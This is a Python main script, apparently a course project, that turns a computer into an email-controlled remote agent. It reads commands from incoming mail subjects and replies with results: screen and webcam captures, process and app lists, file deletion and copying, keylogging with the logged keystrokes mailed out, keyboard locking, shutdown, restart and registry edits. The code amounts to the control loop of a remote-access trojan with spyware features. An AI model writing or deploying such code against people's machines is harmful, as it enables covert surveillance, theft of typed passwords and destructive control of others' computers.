from sender import *
from receiver import *
from ui_login import * 

from tkinter import *
from tkinter import ttk
from PIL import ImageTk, Image
import numpy as np
import cv2
import webbrowser
from utils import *
from datetime import datetime
import os 
from shutil import copyfile
# from time import datetime
from key_log import *
from ui_login import *
#---------------------------GUI-----------------
WD=windown()
gui_mail=content_mail(WD)
WD.screen.mainloop()
#------------------------main code--------------
def get_one_content(content):
    token=content.split(": ")
    print(token)
    return token[-1]
# receiver = Receiver(email,password)


rec = [gui_mail.mail_s]
# subject = "list_process"
pid = None 
name_prog = ""
path = ""
dst = ""
time_tmp = None
is_start=False
cont=""
kc=key_control()
print("App is running")
while True:
    now = datetime.now()
    subject, content,date = gui_mail.receiver.get_mail()
    print(subject)
    # print("=============")
    # print(content)
    # print(date)
    if (date == time_tmp):
        continue
    else:
        time_tmp = date
        if subject == "mac address":
            print(subject)
            mac_add = mac_address()
            gui_mail.sender.send(mac_add,"Result of {}".format(subject),rec)
            print("succes mac address")

        elif subject == "capture screen":
            print(subject)
            capture_screen()
            gui_mail.sender.image_send("Screen capture at {}".format(now),"save_img.png","screen capture",rec)
            print("succes capture screen")

        elif subject == "list app":
            print(subject)
            l1,l2,l3 = list_apps()
            print(l1,l2,l3)
            res = "List of app: \n"
            for i in l1:
                res += "- {} \n".format(i)
            gui_mail.sender.send(res,"Result of {}".format(subject),rec)
            
        elif subject == "list process":
            print(subject)
            l1,l2,l3 = list_processes()
            print(l1,l2,l3)
            res = "List of process: \n"
            for i in range(len(l1)):
                res += "- {} \n".format(l1[i]+" "+l2[i])
            gui_mail.sender.send(res,"Result of {}".format(subject),rec)

        elif subject == "kill":
            print(subject)
            pid = get_one_content(content)
            r = kill(pid)
            if(r==1):
                gui_mail.sender.send("Success","You have succeeded in {}".format(subject+pid),rec)
            else:
                gui_mail.sender.send("failed","You failed in {}".format(subject+pid),rec)

        elif subject == "start":
            print(subject)
            name_prog = get_one_content(content)
            start(name_prog.rstrip())
            gui_mail.sender.send("Success","You have succeeded in {}".format(subject+name_prog),rec)

        elif subject == "show tree":
            print(subject)
            listT = showTree()
            res = "List of Tree: \n"
            for tree in listT:
                res += "- {} \n".format(tree)
            gui_mail.sender.send(res,"Result of {}".format(subject),rec)

        elif subject == "list dir":
            print(subject)
            path = get_one_content(content)
            check, listD = sendListDirs(path.rstrip())
            if check == False:
                gui_mail.sender.send("No file path","Please choose the correct path",rec)
            res = "List of Directory: \n"
            for tree in listD:
                res += "- {} \n".format(tree)
            gui_mail.sender.send(res,"Result of {}".format(subject),rec)

        elif subject == "delete file":
            print(subject)
            path = get_one_content(content)
            check, p = delFile(path.rstrip())
            if check == False:
                gui_mail.sender.send("No file path","Please choose the correct path",rec)
            else:
                gui_mail.sender.send("Success","You have succeeded in {}".format(subject),rec)

        elif subject == "copy file":
            token = content.split("\r\n")
            print(token)
            print(token[0].split(": "))
            print(token[1].split(": "))
            path  = token[0].split(": ")[-1]
            dst = token[1].split(": ")[-1]
            print("path:" ,path,"dst",dst.split("\r")[0])
            check, p = copyFile(path,dst)
            if check == False:
                gui_mail.sender.send("No file path","Please choose the correct path",rec)
            else:
                gui_mail.sender.send("Success","You have succeeded in {}".format(subject),rec)
        elif subject == "webcam":
            print(subject)
            webcam()
            gui_mail.sender.image_send("Webcam capture at {}".format(now),"webcam.png","webcam capture",rec)
            print("succes capture webcam")
        elif subject == "quit":
            gui_mail.sender.send("Close app","Your app have been close",rec)
            break
        elif (subject == "key start logged" and is_start==False):
        	with open("outlog.txt", mode='w') as f:
        		f.write("")
        	print("Enter start")
        	is_start=True
        	kc.key_logger("")
        	gui_mail.sender.send("","Start key log".format(subject),rec)
        elif (subject == "key end" and is_start==True):
            print("Enter end")
            is_start=False
            kc.flat=False
            with open("outlog.txt") as f:
                cont_rs=f.read()
            gui_mail.sender.send(cont_rs,"All key board log: ".format(subject),rec)
        elif (subject=="lock keyboard"):
        	kc.key_logger("lock")
        	gui_mail.sender.send("","Locking".format(subject),rec)
        elif (subject=="unlock keyboard"):
        	kc.key_logger("unlock")
        	gui_mail.sender.send("","Unlocking".format(subject),rec)
        elif (subject=="turn off computer"):
        	gui_mail.sender.send("","Turn off now".format(subject),rec)
        	turnOffComputer()
        elif (subject=="restart computer"):
        	gui_mail.sender.send("","restart now".format(subject),rec)
        	restart()
        elif (subject=="update registry"):
        	token = content.split("\r\n")
        	path = token[0].split(": ")[-1]
        	value = token[1].split(": ")[-1]
        	value_type = token[2].split(": ")[-1]
        	check=set_value(path,value,value_type)
        	if(check==1):
        		gui_mail.sender.send("","success".format(subject),rec)
        	else:
        		gui_mail.sender.send("","failed".format(subject),rec)
print("App have been closed")
gui_mail.sender.destroy()